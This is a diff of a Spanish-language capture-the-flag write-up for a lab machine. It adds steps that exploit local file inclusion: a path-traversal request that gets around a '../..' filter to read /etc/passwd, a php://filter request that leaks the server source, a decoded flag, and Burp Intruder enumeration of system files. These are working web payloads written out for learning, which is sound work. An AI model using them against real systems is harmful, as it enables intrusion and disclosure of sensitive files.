@@ -21,6 +21,7 @@ Explicar la realización del siguiente _Capture the flag_ perteneciente a la pla
 - Explotación LFI (*Local File Inclusion*).
 - Ejecución de RCE (*Remote Code Execution*).
 - Realización de *Path Traversal*.
+- Funcionamiento de *Burp Suite*
 - Realizar una *reverse shell*.
 - Poner en escucha los puertos de la máquina.
 - Obtener una *shell* a partir de un *script*.
@@ -32,7 +33,7 @@ Explicar la realización del siguiente _Capture the flag_ perteneciente a la pla
 
 - *Kali Linux*.
 - Enumeración: *Nmap*, *Dirsearch*.
-- Penetración: *Bash*, *PHP*, *Netcat*, *Python3*, . 
+- Penetración: *Burp Suite*, *Bash*, *PHP*, *Netcat*, *Python3*, . 
 
 ## Steps
 
@@ -64,13 +65,40 @@ Seguidamente, con la ayuda de la herramienta **Dirsearch**, se hace una enumerac
 
 ![Captura de pantalla 2025-04-22 172710](https://github.com/user-attachments/assets/f7530f66-7e9a-42e0-abde-57d1f5ef9e7b)
 
-El arhcivo 'robots.txt' indica a los rastreadores web de motores de búsqueda, a que páginas pueden acceder. En este caso se indica que no se peude acceder al archivo 'test.php' y está instrucción es para todos los motores de búsqueda. Si nos dirigimos a esta pagina se muestra que está en desarrollo y aparece un botón con el que interactuar.
+El archivo 'robots.txt' indica a los rastreadores web de motores de búsqueda, a que páginas pueden acceder. En este caso se indica que no se peude acceder al archivo 'test.php' y está instrucción es para todos los motores de búsqueda. Si nos dirigimos a esta pagina se muestra que está en desarrollo y aparece un botón con el que interactuar.
 
 ![image](https://github.com/user-attachments/assets/687d71d4-dab8-4b87-b910-480669239780)
 
 
 ### Vulnerabilidades explotadas
 
+Al hacer click en el botón, se muestra el mensaje ‘Control is an ilusion’. Si capturamos la petición mediante **Burp Suite**, vemos como mediante el método GET se lee el archivo ‘mrrobot.php’ utilizando el parámetro *view*.
 
+![image](https://github.com/user-attachments/assets/20a78635-aa86-400c-9f95-7d38e64b76a3)
+
+Jugando con este parámetro se puede aprovechar un *Local File Inclusion* (LFI) para vulnerar la máquina. Mediante un *Path traversal* se intenta llegar hasta el archivo ‘/etc/passwd’, pero para conseguirlo se debe saltar un filtro a ‘../..’ con ‘..//..’. El ataque es positivo y se descubre el usuario 1001 llamado ‘archangel’.
+
+<code>GET /test.php?view=/var/www/html/development_testing//..//..//..//..//etc/passwd HTTP/1.1</code>
+
+![image](https://github.com/user-attachments/assets/876549b7-8b52-4f79-83cf-f69b98f78a46)
+
+El siguiente paso es hacer uso de los *wrappers* de *php* que permiten XXXXXX. En este caso se hace uso del ‘*filter*’, en concreto con el convertidor en base64 y el archivo a tratar será ‘test.php’, página que muestra el botón a clicar. Con esto se pretende conseguir el código de esta web en base64, de tal manera que se muestre el código del *backend* (*php*) que se ejecuta en el lado del servidor y no sólo el código *html* que es ejecutado en el lado del cliente.
+Este código es sacado de la página [hacktricks]( https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion).
+
+<code>GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1</code>
+
+![image](https://github.com/user-attachments/assets/25d343d1-44ba-45ff-a31e-c9c742826131)
+
+Desde el terminal de *Linux* se decodifica el código devuelto con la siguiente instrucción.
+
+<code>echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d</code>
+
+![Captura de pantalla 2025-04-24 125131](https://github.com/user-attachments/assets/e69da747-f603-4432-8d26-6e2dd070fdf9)
+
+El código *php* devuelto confirma el filtro que se aplicaba para evitar el *path traversal* y además contiene una nueva *flag*.
+
+**Flag: thm{explo1t1ng_lf1}**
+
+Para no ir mirando archivo por archivo de manera manual como se ha hecho con ‘/etc/passwd’, *BurpSuite* tiene una opción llamada *Intruder*, por medio la cual, se puede pasar una lista (.txt) preparada con archivos de sistema interesantes y que sean comprobados automáticamente. Gracias a esto se descubre el archivo ‘/var/log/apache2/acces.log’.
 
 **Flag:**
